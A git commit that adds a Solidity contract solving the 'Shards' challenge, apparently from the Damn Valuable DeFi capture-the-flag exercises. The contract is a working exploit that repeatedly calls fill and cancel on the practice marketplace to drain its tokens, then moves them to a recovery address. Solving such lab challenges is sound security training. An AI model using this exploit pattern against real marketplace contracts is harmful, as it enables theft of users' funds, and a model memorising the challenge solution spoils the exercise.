1e19a24ae495f2f36245c63ddaa4858aa0b91acb
random1106 <yierlin.math@gmail.com>
2025-07-05 17:10:36 -0500

    solve shards

---
+++ test/shards/Attacker.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.25;
+import {
+    ShardsNFTMarketplace, DamnValuableToken
+} from "../../src/shards/ShardsNFTMarketplace.sol";
+contract Attacker {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        for (uint256 i = 0; i < 7519; i++) {
+            marketplace.fill(1, 133);
+            marketplace.cancel(1, i);
+        }
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
